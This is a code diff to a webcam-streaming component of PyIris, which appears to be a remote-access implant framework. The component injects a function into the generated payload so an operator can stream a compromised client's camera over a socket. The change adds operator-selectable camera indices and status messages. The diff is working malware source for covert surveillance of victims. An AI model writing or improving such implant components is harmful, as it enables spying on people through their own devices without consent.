@@ -8,8 +8,17 @@ def main(option):
         config.import_statements.append('import pickle')
         config.import_statements.append('import cv2')
         config.functions.append('''
-def webcam_stream(sock):
-    camera = cv2.VideoCapture(0)
+def webcam_stream(sock, data):
+    index_list = data.split(" ")
+    if len(index_list) > 1:
+        camera = cv2.VideoCapture(index_list[1])
+    else: 
+        camera = cv2.VideoCapture(0)
+    if not camera.isOpened():
+        send_all(sock, "[-]Unable to open user camera, possibly the wrong camera index was provided, try providing a camera index of another non-zero integer eg -1, 2")
+        return
+    else:
+        send_all(sock, "[+]Successfully opened camera!")
     while True:
         ret, frame = camera.read()
         if ret:
@@ -24,7 +33,7 @@ def webcam_stream(sock):
             return''')
         config.logics.append('''
             elif command == "webcam_stream":
-                webcam_stream(s)''')
+                webcam_stream(s, data)''')
         config.help_menu['webcam_stream'] = 'Stream clients webcam to PyIris'
     elif option == 'info':
         print('\nName             : Webcam streaming component' \
